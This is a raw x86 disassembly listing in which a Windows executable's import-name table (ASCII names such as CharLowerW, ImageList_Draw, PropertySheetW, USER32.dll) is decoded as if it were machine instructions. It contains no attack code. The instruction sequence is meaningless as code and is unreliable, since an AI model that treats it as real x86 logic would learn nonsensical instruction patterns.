  412cb7:	outs   dx,BYTE PTR ds:[esi]
  412cb8:	popa   
  412cb9:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  412cbd:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412cc4:	sub    BYTE PTR [eax],al
  412cc6:	inc    ebx
  412cc7:	push   0x6f4c7261
  412ccc:	ja     0x412d33
  412cce:	jb     0x412d12
  412cd0:	jne    0x412d38
  412cd2:	push   di
  412cd4:	add    BYTE PTR [eax],al
  412cd6:	inc    ebx
  412cd7:	add    BYTE PTR [ebx+0x6c],al
  412cda:	imul   esp,DWORD PTR [ebp+0x6e],0x536f5474
  412ce1:	arpl   WORD PTR [edx+0x65],si
  412ce4:	outs   dx,BYTE PTR gs:[esi]
  412ce6:	add    BYTE PTR [eax],al
  412ce8:	add    eax,DWORD PTR [eax]
  412cea:	inc    ecx
  412ceb:	fs push 0x75
  412cee:	jae    0x412d64
  412cf0:	push   edi
  412cf1:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  412cf8:	arpl   WORD PTR [ebp+eax*2+0x78],si
  412cfc:	add    BYTE PTR [eax],al
  412cfe:	icebp  
  412cff:	add    DWORD PTR [eax+0x6f],edx
  412d02:	jae    0x412d78
  412d04:	dec    ebp
  412d05:	gs jae 0x412d7b
  412d08:	popa   
  412d09:	addr16 gs inc ecx
  412d0c:	add    BYTE PTR [eax],al
  412d0e:	out    dx,al
  412d0f:	add    DWORD PTR [eax+0x65],edx
  412d12:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  412d17:	jae    0x412d7a
  412d19:	addr16 gs inc ecx
  412d1c:	add    BYTE PTR [eax],al
  412d1e:	dec    ebx
  412d1f:	add    DWORD PTR [edi+0x65],eax
  412d22:	je     0x412d74
  412d24:	jb     0x412d95
  412d26:	jo     0x412d7f
  412d28:	add    BYTE PTR [eax],al
  412d2a:	inc    esi
  412d2b:	add    BYTE PTR [ebx+0x6c],al
  412d2e:	outs   dx,DWORD PTR ds:[esi]
  412d2f:	jae    0x412d96
  412d31:	inc    esp
  412d32:	gs jae 0x412da0
  412d35:	je     0x412da6
  412d37:	jo     0x412d39
  412d39:	add    cl,cl
  412d3b:	add    DWORD PTR [ebp+0x61],ecx
  412d3e:	jo     0x412d97
  412d40:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  412d47:	imul   ebp,DWORD PTR [esi+0x74],0x2020073
  412d4e:	push   edx
  412d4f:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  412d58:	popa   
  412d59:	jae    0x412dce
  412d5b:	inc    ecx
  412d5c:	add    BYTE PTR [eax],al
  412d5e:	mov    es,WORD PTR [ecx]
  412d60:	dec    ecx
  412d61:	jae    0x412da6
  412d63:	push   0x6c417261
  412d68:	jo     0x412dd2
  412d6a:	popa   
  412d6b:	dec    esi
  412d6c:	jne    0x412ddb
  412d6e:	gs jb  0x412dda
  412d71:	arpl   WORD PTR [edi+0x0],dx
  412d74:	mov    cl,0x1
  412d76:	dec    esp
  412d77:	outs   dx,DWORD PTR ds:[esi]
  412d78:	popa   
  412d79:	fs dec ecx
  412d7b:	ins    DWORD PTR es:[edi],dx
  412d7c:	popa   
  412d7d:	addr16 gs inc ecx
  412d80:	add    BYTE PTR [eax],al
  412d82:	sahf   
  412d83:	add    DWORD PTR [ecx+0x73],ecx
  412d86:	push   edx
  412d87:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  412d8c:	jo     0x412e02
  412d8e:	jns    0x412d90
  412d90:	mov    es,WORD PTR [edx]
  412d92:	push   esp
  412d93:	outs   dx,DWORD PTR ds:[esi]
  412d94:	push   ebp
  412d95:	outs   dx,BYTE PTR ds:[esi]
  412d96:	imul   esp,DWORD PTR [ebx+0x6f],0x78456564
  412d9d:	add    BYTE PTR [ebx],bh
  412d9f:	add    DWORD PTR [edi+0x65],eax
  412da2:	je     0x412df1
  412da4:	gs jae 0x412e1a
  412da7:	popa   
  412da8:	addr16 gs inc ebp
  412dab:	js     0x412e21
  412dad:	jb     0x412e10
  412daf:	dec    ecx
  412db0:	outs   dx,BYTE PTR ds:[esi]
  412db1:	outs   dx,WORD PTR ds:[esi]
  412db3:	add    BYTE PTR [ebp+0x1],al
  412db6:	inc    edi
  412db7:	gs je  0x412e0a
  412dba:	popa   
  412dbb:	jb     0x412e22
  412dbd:	outs   dx,BYTE PTR ds:[esi]
  412dbe:	je     0x412dc0
  412dc0:	bound  eax,QWORD PTR [eax]
  412dc2:	inc    ebx
  412dc3:	jb     0x412e2a
  412dc5:	popa   
  412dc6:	je     0x412e2d
  412dc8:	push   edi
  412dc9:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412dd0:	inc    ecx
  412dd1:	add    BYTE PTR [ecx+0x766e4901],cl
  412dd7:	popa   
  412dd8:	ins    BYTE PTR es:[edi],dx
  412dd9:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x63655265
  412de1:	je     0x412de3
  412de3:	add    BYTE PTR [ebp+0x2],ch
  412de6:	push   ebx
  412de7:	gs je  0x412e41
  412dea:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  412df1:	outs   dx,BYTE PTR ds:[esi]
  412df2:	addr16 inc ecx
  412df4:	add    BYTE PTR [eax],al
  412df6:	adc    eax,0x6c655202
  412dfb:	gs popa 
  412dfd:	jae    0x412e64
  412dff:	inc    esp
  412e00:	inc    ebx
  412e01:	add    BYTE PTR [eax+eax*1],ah
  412e04:	inc    ebx
  412e05:	push   0x65676e61
  412e0a:	dec    ebp
  412e0b:	outs   dx,BYTE PTR gs:[esi]
  412e0d:	jne    0x412e66
  412e0f:	add    BYTE PTR [ebx],bh
  412e11:	add    BYTE PTR [ebx+0x68],al
  412e14:	arpl   WORD PTR gs:[ebx+0x4d],bp
  412e18:	outs   dx,BYTE PTR gs:[esi]
  412e1a:	jne    0x412e65
  412e1c:	je     0x412e83
  412e1e:	ins    DWORD PTR es:[edi],dx
  412e1f:	add    al,ch
  412e21:	add    DWORD PTR [edi+0x70],ecx
  412e24:	outs   dx,BYTE PTR gs:[esi]
  412e26:	dec    ecx
  412e27:	arpl   WORD PTR [edi+0x6e],bp
  412e2a:	add    BYTE PTR [eax],al
  412e2c:	mov    ds:0x57734901,al
  412e31:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  412e38:	imul   esp,DWORD PTR [ebx+0x6f],0xce006564
  412e3f:	add    DWORD PTR [ebp+0x65],ecx
  412e42:	jae    0x412eb7
  412e44:	popa   
  412e45:	addr16 gs inc edx
  412e48:	outs   dx,DWORD PTR ds:[esi]
  412e49:	js     0x412e8c
  412e4b:	add    BYTE PTR [ebp+0x61724400],dh
  412e51:	ja     0x412ea0
  412e53:	outs   dx,BYTE PTR gs:[esi]
  412e55:	jne    0x412e99
  412e57:	popa   
  412e58:	jb     0x412e5a
  412e5a:	inc    edx
  412e5b:	add    dl,BYTE PTR [ebx+0x65]
  412e5e:	je     0x412ea6
  412e60:	outs   dx,DWORD PTR ds:[esi]
  412e61:	jb     0x412ec8
  412e63:	addr16 jb 0x412ed5
  412e66:	jne    0x412ed6
  412e68:	fs push edi
  412e6a:	imul   ebp,DWORD PTR [esi+0x64],0xc200776f
  412e71:	add    dh,BYTE PTR [edi+0x76]
  412e74:	jae    0x412ee6
  412e76:	jb     0x412ee1
  412e78:	outs   dx,BYTE PTR ds:[esi]
  412e79:	je     0x412ee1
  412e7b:	push   edi
  412e7c:	add    BYTE PTR [eax],al
  412e7e:	mov    al,ds:0x57734901
  412e83:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412e8a:	push   ebp
  412e8b:	add    DWORD PTR [edi+0x65],eax
  412e8e:	je     0x412ee3
  412e90:	arpl   WORD PTR [edx+0x6f],si
  412e93:	ins    BYTE PTR es:[edi],dx
  412e94:	ins    BYTE PTR es:[edi],dx
  412e95:	push   eax
  412e96:	outs   dx,DWORD PTR ds:[esi]
  412e97:	jae    0x412e99
  412e99:	add    al,dh
  412e9b:	add    BYTE PTR [edi+0x65],al
  412e9e:	je     0x412ee1
  412ea0:	jae    0x412f1b
  412ea2:	outs   dx,BYTE PTR ds:[esi]
  412ea3:	arpl   WORD PTR [ebx+0x65],cx
  412ea6:	jns    0x412efb
  412ea8:	je     0x412f0b
  412eaa:	je     0x412f11
  412eac:	add    BYTE PTR [eax],al
  412eae:	or     eax,0x74654701
  412eb3:	inc    esp
  412eb4:	imul   esp,DWORD PTR [ecx+0x6c],0x6142676f
  412ebb:	jae    0x412f22
  412ebd:	push   ebp
  412ebe:	outs   dx,BYTE PTR ds:[esi]
  412ebf:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x5502a500
  412ec7:	jo     0x412f2d
  412ec9:	popa   
  412eca:	je     0x412f31
  412ecc:	push   edi
  412ecd:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412ed4:	or     eax,DWORD PTR [ecx]
  412ed6:	inc    edi
  412ed7:	gs je  0x412f1e
  412eda:	inc    ebx
  412edb:	inc    ebp
  412edc:	js     0x412ede
  412ede:	stos   DWORD PTR es:[edi],eax
  412edf:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  412ee3:	fs inc ebx
  412ee5:	jne    0x412f59
  412ee7:	jae    0x412f58
  412ee9:	jb     0x412f2c
  412eeb:	add    BYTE PTR [edx+eax*1+0x53],bl
  412eef:	gs je  0x412f45
  412ef2:	arpl   WORD PTR [edx+0x6f],si
  412ef5:	ins    BYTE PTR es:[edi],dx
  412ef6:	ins    BYTE PTR es:[edi],dx
  412ef7:	push   edx
  412ef8:	popa   
  412ef9:	outs   dx,BYTE PTR ds:[esi]
  412efa:	add    BYTE PTR gs:[bx+si],al
  412efe:	cmp    DWORD PTR [eax],eax
  412f00:	inc    ebx
  412f01:	push   0x70557261
  412f06:	jo     0x412f6d
  412f08:	jb     0x412f61
  412f0a:	add    BYTE PTR [eax],al
  412f0c:	fwait
  412f0d:	add    dl,BYTE PTR [ebp+0x6e]
  412f10:	ins    BYTE PTR es:[edi],dx
  412f11:	outs   dx,DWORD PTR ds:[esi]
  412f12:	popa   
  412f13:	fs dec ebx
  412f15:	gs jns 0x412f7a
  412f18:	outs   dx,DWORD PTR ds:[esi]
  412f19:	popa   
  412f1a:	jb     0x412f80
  412f1c:	dec    esp
  412f1d:	popa   
  412f1e:	jns    0x412f8f
  412f20:	jne    0x412f96
  412f22:	add    BYTE PTR [eax],al
  412f24:	push   esi
  412f25:	add    DWORD PTR [edi+0x65],eax
  412f28:	je     0x412f7d
  412f2a:	arpl   WORD PTR [edx+0x6f],si
  412f2d:	ins    BYTE PTR es:[edi],dx
  412f2e:	ins    BYTE PTR es:[edi],dx
  412f2f:	push   edx
  412f30:	popa   
  412f31:	outs   dx,BYTE PTR ds:[esi]
  412f32:	add    BYTE PTR gs:[bx+si],al
  412f36:	ins    DWORD PTR es:[edi],dx
  412f37:	add    DWORD PTR [edi+0x65],eax
  412f3a:	je     0x412f93
  412f3c:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  412f43:	outs   dx,BYTE PTR ds:[esi]
  412f44:	addr16 push edi
  412f46:	add    BYTE PTR [eax],al
  412f48:	add    BYTE PTR [ecx],0x49
  412f4b:	outs   dx,BYTE PTR ds:[esi]
  412f4c:	data16 ins BYTE PTR es:[edi],dx
  412f4e:	popa   
  412f4f:	je     0x412fb6
  412f51:	push   edx
  412f52:	arpl   WORD PTR gs:[eax+eax*1+0x16],si
  412f57:	add    dl,BYTE PTR [edx+0x65]
  412f5a:	ins    DWORD PTR es:[edi],dx
  412f5b:	outs   dx,DWORD PTR ds:[esi]
  412f5c:	jbe    0x412fc3
  412f5e:	dec    ebp
  412f5f:	outs   dx,BYTE PTR gs:[esi]
  412f61:	jne    0x412f63
  412f63:	add    BYTE PTR [ebx+0x61724400],ch
  412f69:	ja     0x412fac
  412f6b:	outs   dx,BYTE PTR ds:[esi]
  412f6c:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  412f73:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  412f78:	das    
  412f79:	add    dl,BYTE PTR [ebx+0x65]
  412f7c:	je     0x412fbf
  412f7e:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  412f82:	gs push edi
  412f84:	imul   ebp,DWORD PTR [esi+0x64],0x9c00776f
  412f8b:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412f8f:	ins    BYTE PTR es:[edi],dx
  412f90:	outs   dx,DWORD PTR ds:[esi]
  412f91:	addr16 inc edx
  412f93:	outs   dx,DWORD PTR ds:[esi]
  412f94:	js     0x412fe6
  412f96:	popa   
  412f97:	jb     0x412ffa
  412f99:	ins    DWORD PTR es:[edi],dx
  412f9a:	inc    ecx
  412f9b:	add    bh,ah
  412f9d:	add    BYTE PTR [esi+0x72],al
  412fa0:	popa   
  412fa1:	ins    DWORD PTR es:[edi],dx
  412fa2:	gs push edx
  412fa4:	arpl   WORD PTR gs:[eax+eax*1-0x68],si
  412fa9:	add    DWORD PTR [ecx+0x73],ecx
  412fac:	inc    esp
  412fad:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  412fb4:	jae    0x413029
  412fb6:	popa   
  412fb7:	addr16 gs push edi
  412fba:	add    BYTE PTR [eax],al
  412fbc:	xor    DWORD PTR [eax],eax
  412fbe:	inc    ebx
  412fbf:	push   0x72507261
  412fc4:	gs jbe 0x41301e
  412fc7:	add    BYTE PTR ds:0x74654701,dl
  412fcd:	inc    esi
  412fce:	outs   dx,DWORD PTR ds:[esi]
  412fcf:	jb     0x413036
  412fd1:	addr16 jb 0x413043
  412fd4:	jne    0x413044
  412fd6:	fs push edi
  412fd8:	imul   ebp,DWORD PTR [esi+0x64],0xb700776f
  412fdf:	add    dl,BYTE PTR [edi+0x61]
  412fe2:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x706e4972
  412fea:	jne    0x413060
  412fec:	dec    ecx
  412fed:	fs ins BYTE PTR es:[edi],dx
  412fef:	add    BYTE PTR gs:[eax],al
  412ff2:	push   edi
  412ff3:	add    dl,BYTE PTR [ebx+0x65]
  412ff6:	je     0x413048
  412ff8:	jb     0x413069
  412ffa:	jo     0x413053
  412ffc:	add    BYTE PTR [eax],al
  412ffe:	dec    eax
  412fff:	add    dl,BYTE PTR [ebx+0x65]
  413002:	je     0x413051
  413004:	outs   dx,BYTE PTR gs:[esi]
  413006:	jne    0x413008
  413008:	scas   al,BYTE PTR es:[edi]
  413009:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41300d:	fs inc ebx
  41300f:	jne    0x413083
  413011:	jae    0x413082
  413013:	jb     0x41306c
  413015:	add    BYTE PTR [edi+0x2],bl
  413018:	push   ebx
  413019:	gs je  0x41306f
  41301c:	jns    0x413091
  41301e:	inc    ebx
  41301f:	outs   dx,DWORD PTR ds:[esi]
  413020:	ins    BYTE PTR es:[edi],dx
  413021:	outs   dx,DWORD PTR ds:[esi]
  413022:	jb     0x413097
  413024:	add    BYTE PTR [eax],al
  413026:	xchg   esp,eax
  413027:	add    dl,BYTE PTR [edx+esi*2+0x61]
  41302b:	outs   dx,BYTE PTR ds:[esi]
  41302c:	jae    0x41309a
  41302e:	popa   
  41302f:	je     0x413096
  413031:	inc    ecx
  413032:	arpl   WORD PTR [ebx+0x65],sp
  413035:	ins    BYTE PTR es:[edi],dx
  413036:	gs jb  0x41309a
  413039:	je     0x4130aa
  41303b:	jb     0x413094
  41303d:	add    BYTE PTR [edi+0x66654400],cl
  413043:	push   edi
  413044:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  41304b:	outs   dx,DWORD PTR ds:[esi]
  41304c:	arpl   WORD PTR [edi+0x0],dx
  41304f:	add    BYTE PTR [ecx+0x0],ah
  413052:	inc    ebx
  413053:	jb     0x4130ba
  413055:	popa   
  413056:	je     0x4130bd
  413058:	push   eax
  413059:	outs   dx,DWORD PTR ds:[esi]
  41305a:	jo     0x4130d1
  41305c:	jo     0x4130ab
  41305e:	outs   dx,BYTE PTR gs:[esi]
  413060:	jne    0x413062
  413062:	push   ecx
  413063:	add    dl,BYTE PTR [ebx+0x65]
  413066:	je     0x4130b8
  413068:	popa   
  413069:	jb     0x4130d0
  41306b:	outs   dx,BYTE PTR ds:[esi]
  41306c:	je     0x41306e
  41306e:	popf   
  41306f:	add    BYTE PTR [ecx+ebp*2+0x61],al
  413073:	ins    BYTE PTR es:[edi],dx
  413074:	outs   dx,DWORD PTR ds:[esi]
  413075:	addr16 inc edx
  413077:	outs   dx,DWORD PTR ds:[esi]
  413078:	js     0x4130ca
  41307a:	popa   
  41307b:	jb     0x4130de
  41307d:	ins    DWORD PTR es:[edi],dx
  41307e:	push   edi
  41307f:	add    BYTE PTR [edx+0x6c695402],cl
  413085:	gs push edi
  413087:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  41308e:	sub    DWORD PTR [eax],eax
  413090:	inc    ebx
  413091:	push   0x6f4c7261
  413096:	ja     0x4130fd
  413098:	jb     0x4130f1
  41309a:	add    BYTE PTR [eax],al
  41309c:	out    dx,eax
  41309d:	add    DWORD PTR [eax+0x65],edx
  4130a0:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  4130a5:	jae    0x413108
  4130a7:	addr16 gs push edi
  4130aa:	add    BYTE PTR [eax],al
  4130ac:	jne    0x4130af
  4130ae:	inc    edi
  4130af:	gs je  0x413109
  4130b2:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4130b9:	js     0x41312f
  4130bb:	inc    ecx
  4130bc:	add    BYTE PTR [eax],al
  4130be:	add    DWORD PTR ds:[edi+0x65],eax
  4130c2:	je     0x413111
  4130c4:	gs jae 0x41313a
  4130c7:	popa   
  4130c8:	addr16 gs push edi
  4130cb:	add    BYTE PTR ds:0x61684300,ch
  4130d1:	jb     0x413121
  4130d3:	gs js  0x41314a
  4130d6:	push   edi
  4130d7:	add    BYTE PTR [ecx+eax*1+0x64616f4c],bh
  4130de:	push   ebx
  4130df:	je     0x413153
  4130e1:	imul   ebp,DWORD PTR [esi+0x67],0x2800057
  4130e8:	push   ebx
  4130e9:	push   0x6957776f
  4130ee:	outs   dx,BYTE PTR ds:[esi]
  4130ef:	outs   dx,DWORD PTR fs:[esi]
  4130f1:	ja     0x413134
  4130f3:	jae    0x41316e
  4130f5:	outs   dx,BYTE PTR ds:[esi]
  4130f6:	arpl   WORD PTR [eax],ax
  4130f8:	add    BYTE PTR ss:[ebx+0x68],al
  4130fc:	popa   
  4130fd:	jb     0x413154
  4130ff:	jo     0x413171
  413101:	gs jb  0x413145
  413104:	add    BYTE PTR [eax],al
  413106:	sti    
  413107:	add    DWORD PTR [eax+0x74],edx
  41310a:	dec    ecx
  41310b:	outs   dx,BYTE PTR ds:[esi]
  41310c:	push   edx
  41310d:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  413112:	sbb    eax,DWORD PTR [eax]
  413114:	inc    ebx
  413115:	popa   
  413116:	ins    BYTE PTR es:[edi],dx
  413117:	ins    BYTE PTR es:[edi],dx
  413118:	push   edi
  413119:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  413120:	outs   dx,DWORD PTR ds:[esi]
  413121:	arpl   WORD PTR [edi+0x0],dx
  413124:	lahf   
  413125:	add    BYTE PTR [ecx+ebp*2+0x73],al
  413129:	jo     0x41318c
  41312b:	je     0x413190
  41312d:	push   0x7373654d
  413132:	popa   
  413133:	addr16 gs inc ecx
  413136:	add    BYTE PTR [eax],al
  413138:	mov    BYTE PTR [edx],al
  41313a:	push   esp
  41313b:	popa   
  41313c:	bound  esp,QWORD PTR [edx+0x65]
  41313f:	fs push esp
  413141:	gs js  0x4131b8
  413144:	dec    edi
  413145:	jne    0x4131bb
  413147:	push   edi
  413148:	add    BYTE PTR [eax],al
  41314a:	sub    eax,DWORD PTR [edx]
  41314c:	push   ebx
  41314d:	outs   dx,BYTE PTR gs:[esi]
  41314f:	fs dec ebp
  413151:	gs jae 0x4131c7
  413154:	popa   
  413155:	addr16 gs push edi
  413158:	add    BYTE PTR [eax],al
  41315a:	add    DWORD PTR fs:[edi+0x65],eax
  41315e:	je     0x4131b5
  413160:	jo     0x4131c6
  413162:	popa   
  413163:	je     0x4131ca
  413165:	push   edx
  413166:	outs   dx,BYTE PTR ds:[si]
  413168:	add    BYTE PTR [eax],al
  41316a:	mov    eax,0x61724400
  41316f:	ja     0x4131c4
  413171:	je     0x4131d4
  413173:	je     0x4131da
  413175:	push   edi
  413176:	add    BYTE PTR [eax],al
  413178:	sub    eax,0x74654701
  41317d:	dec    ebp
  41317e:	outs   dx,BYTE PTR gs:[esi]
  413180:	jne    0x4131c5
  413182:	push   0x4d6b6365
  413187:	popa   
  413188:	jb     0x4131f5
  41318a:	inc    esp
  41318b:	imul   ebp,DWORD PTR [ebp+0x65],0x6f69736e
  413192:	outs   dx,BYTE PTR ds:[esi]
  413193:	jae    0x413195
  413195:	add    BYTE PTR [ebx+0x616f4c01],bh
  41319b:	fs push ebx
  41319d:	je     0x413211
  41319f:	imul   ebp,DWORD PTR [esi+0x67],0x2590041
  4131a6:	push   ebx
  4131a7:	gs je  0x4131fc
  4131aa:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  4131af:	jo     0x413225
  4131b1:	jns    0x4131b3
  4131b3:	add    BYTE PTR [edi+0x0],dl
  4131b6:	inc    ebx
  4131b7:	jb     0x41321e
  4131b9:	popa   
  4131ba:	je     0x413221
  4131bc:	inc    esp
  4131bd:	imul   esp,DWORD PTR [ecx+0x6c],0x6e49676f
  4131c4:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  4131cc:	jb     0x41322f
  4131ce:	ins    DWORD PTR es:[edi],dx
  4131cf:	push   edi
  4131d0:	add    BYTE PTR [eax],al
  4131d2:	cmp    BYTE PTR [eax],al
  4131d4:	inc    ebx
  4131d5:	push   0x70557261
  4131da:	jo     0x413241
  4131dc:	jb     0x413220
  4131de:	jne    0x413246
  4131e0:	push   di
  4131e2:	add    BYTE PTR [eax],al
  4131e4:	ja     0x4131e7
  4131e6:	inc    edi
  4131e7:	gs je  0x413241
  4131ea:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4131f1:	js     0x413267
  4131f3:	dec    esp
  4131f4:	outs   dx,BYTE PTR gs:[esi]
  4131f6:	addr16 je 0x413261
  4131f9:	push   edi
  4131fa:	add    BYTE PTR [eax],al
  4131fc:	xor    eax,0x61684300
  413201:	jb     0x413257
  413203:	outs   dx,DWORD PTR ds:[esi]
  413204:	dec    edi
  413205:	gs ins DWORD PTR es:[edi],dx
  413207:	push   edi
  413208:	add    BYTE PTR [eax],al
  41320a:	dec    edx
  41320b:	add    dl,BYTE PTR [ebx+0x65]
  41320e:	je     0x41325d
  413210:	outs   dx,BYTE PTR gs:[esi]
  413212:	jne    0x413258
  413214:	gs popaw 
  413217:	jne    0x413285
  413219:	je     0x413264
  41321b:	je     0x413282
  41321d:	ins    DWORD PTR es:[edi],dx
  41321e:	add    BYTE PTR [eax],al
  413220:	push   ebp
  413221:	push   ebx
  413222:	inc    ebp
  413223:	push   edx
  413224:	xor    esi,DWORD PTR [edx]
  413226:	cs fs ins BYTE PTR es:[edi],dx
  413229:	ins    BYTE PTR es:[edi],dx
  41322a:	add    BYTE PTR [eax],al
  41322c:	push   ebx
  41322d:	add    BYTE PTR [ecx+0x6d],cl
  413230:	popa   
  413231:	addr16 gs dec esp
  413234:	imul   esi,DWORD PTR [ebx+0x74],0x7465535f
  41323b:	dec    ecx
  41323c:	arpl   WORD PTR [edi+0x6e],bp
  41323f:	push   ebx
  413240:	imul   edi,DWORD PTR [edx+0x65],0x49005600
  413247:	ins    DWORD PTR es:[edi],dx
  413248:	popa   
  413249:	addr16 gs dec esp
  41324c:	imul   esi,DWORD PTR [ebx+0x74],0x6972575f
  413253:	je     0x4132ba
  413255:	add    BYTE PTR [esi+0x0],cl
  413258:	dec    ecx
  413259:	ins    DWORD PTR es:[edi],dx
  41325a:	popa   
  41325b:	addr16 gs dec esp
  41325e:	imul   esi,DWORD PTR [ebx+0x74],0x7065525f
  413265:	ins    BYTE PTR es:[edi],dx
  413266:	popa   
  413267:	arpl   WORD PTR [ebp+0x49],sp
  41326a:	arpl   WORD PTR [edi+0x6e],bp
  41326d:	add    BYTE PTR [esi],dh
  41326f:	add    BYTE PTR [ecx+0x6d],cl
  413272:	popa   
  413273:	addr16 gs dec esp
  413276:	imul   esi,DWORD PTR [ebx+0x74],0x6172445f
  41327d:	ja     0x41327f
  41327f:	add    BYTE PTR [ebx],dl
  413281:	add    BYTE PTR [ebx+0x72],al
  413284:	gs popa 
  413286:	je     0x4132ed
  413288:	push   eax
  413289:	jb     0x4132fa
  41328b:	jo     0x4132f2
  41328d:	jb     0x413303
  41328f:	jns    0x4132e4
  413291:	push   0x50746565
  413296:	popa   
  413297:	addr16 gs push edi
  41329a:	add    BYTE PTR [eax],al
  41329c:	pop    esp
  41329d:	add    BYTE PTR [eax+0x72],dl
  4132a0:	outs   dx,DWORD PTR ds:[esi]
  4132a1:	jo     0x413308
  4132a3:	jb     0x413319
  4132a5:	jns    0x4132fa
  4132a7:	push   0x57746565
  4132ac:	add    BYTE PTR [eax],al
  4132ae:	inc    ebx
  4132af:	dec    edi
  4132b0:	dec    ebp
  4132b1:	inc    ebx
  4132b2:	push   esp
  4132b3:	dec    esp
  4132b4:	xor    esi,DWORD PTR [edx]
  4132b6:	cs fs ins BYTE PTR es:[edi],dx
  4132b9:	ins    BYTE PTR es:[edi],dx
  4132ba:	add    BYTE PTR [eax],al
  4132bc:	mov    WORD PTR [eax],es
  4132be:	inc    ebx
  4132bf:	jb     0x413326
  4132c1:	popa   
  4132c2:	je     0x413329
  4132c4:	inc    ebx
  4132c5:	outs   dx,DWORD PTR ds:[esi]
  4132c6:	ins    DWORD PTR es:[edi],dx
  4132c7:	jo     0x41332a
  4132c9:	je     0x413334
  4132cb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  4132cf:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xa5000070
  4132d7:	add    BYTE PTR [ebx+0x72],al
  4132da:	gs popa 
  4132dc:	je     0x413343
  4132de:	push   eax
  4132df:	popa   
  4132e0:	ins    BYTE PTR es:[edi],dx
  4132e1:	gs je  0x413358
  4132e4:	add    BYTE PTR gs:[ebx+0x746e4901],dl
  4132eb:	gs jb  0x413361
  4132ee:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  4132f3:	imul   esi,DWORD PTR [eax+0x52],0x746365
  4132fa:	into   
  4132fb:	add    DWORD PTR [ebx+0x65],edx
  4132fe:	ins    BYTE PTR es:[edi],dx
  4132ff:	arpl   WORD PTR gs:[edi+ecx*2+0x62],si
  413304:	push   0x65
  413306:	arpl   WORD PTR [eax+eax*1+0x0],si
  41330a:	jp     0x41330d
  41330c:	inc    edi
  41330d:	gs je  0x413363
  413310:	jns    0x413385
  413312:	je     0x413379
  413314:	ins    DWORD PTR es:[edi],dx
  413315:	push   eax
  413316:	popa   
  413317:	ins    BYTE PTR es:[edi],dx
  413318:	gs je  0x41338f
  41331b:	gs push ebp
  41331d:	jae    0x413384
  41331f:	add    BYTE PTR [ecx+0x65724300],cl
  413325:	popa   
  413326:	je     0x41338d
  413328:	inc    edx
  413329:	jb     0x4133a0
  41332b:	jae    0x413395
  41332d:	dec    ecx
  41332e:	outs   dx,BYTE PTR ds:[esi]
  41332f:	imul   esi,DWORD PTR fs:[edx+0x65],0xe8007463
  413337:	add    DWORD PTR [ebx+0x65],edx
  41333a:	je     0x413389
  41333c:	popa   
  41333d:	jo     0x41338c
  41333f:	outs   dx,DWORD PTR ds:[esi]
  413340:	fs add BYTE PTR gs:[eax],al
  413344:	pop    esp
  413345:	add    DWORD PTR [edi+0x65],eax
  413348:	je     0x413396
  41334a:	popa   
  41334b:	jns    0x4133bc
  41334d:	jne    0x4133c3
  41334f:	add    bh,ch
  413351:	add    DWORD PTR [ebx+0x65],edx
  413354:	je     0x4133a6
  413356:	imul   edi,DWORD PTR [eax+0x65],0xc700006c
  41335d:	add    DWORD PTR [ebx+0x61],edx
  413360:	jbe    0x4133c7
  413362:	inc    esp
  413363:	inc    ebx
  413364:	add    BYTE PTR [eax],al
  413366:	pop    edi
  413367:	add    DWORD PTR [edi+0x65],eax
  41336a:	je     0x4133b9
  41336c:	popa   
  41336d:	jo     0x4133bc
  41336f:	outs   dx,DWORD PTR ds:[esi]
  413370:	fs add BYTE PTR gs:[eax],al
  413374:	mov    ds:0x65724300,al
  413379:	popa   
  41337a:	je     0x4133e1
  41337c:	dec    ecx
  41337d:	inc    ebx
  41337e:	push   edi
  41337f:	add    BYTE PTR [esi+0x65724300],dl
  413385:	popa   
  413386:	je     0x4133ed
  413388:	inc    ebp
  413389:	ins    BYTE PTR es:[edi],dx
  41338a:	ins    BYTE PTR es:[edi],dx
  41338b:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  413392:	outs   dx,BYTE PTR ds:[esi]
  413393:	dec    ecx
  413394:	outs   dx,BYTE PTR ds:[esi]
  413395:	imul   esi,DWORD PTR fs:[edx+0x65],0x99007463
  41339d:	add    BYTE PTR [ebx+0x72],al
  4133a0:	gs popa 
  4133a2:	je     0x413409
  4133a4:	inc    esi
  4133a5:	outs   dx,DWORD PTR ds:[esi]
  4133a6:	outs   dx,BYTE PTR ds:[esi]
  4133a7:	je     0x4133ea
  4133a9:	add    BYTE PTR ds:0x61725402,cl
  4133af:	outs   dx,BYTE PTR ds:[esi]
  4133b0:	jae    0x41341e
  4133b2:	popa   
  4133b3:	je     0x41341a
  4133b5:	inc    ebx
  4133b6:	push   0x65737261
  4133bb:	je     0x413406
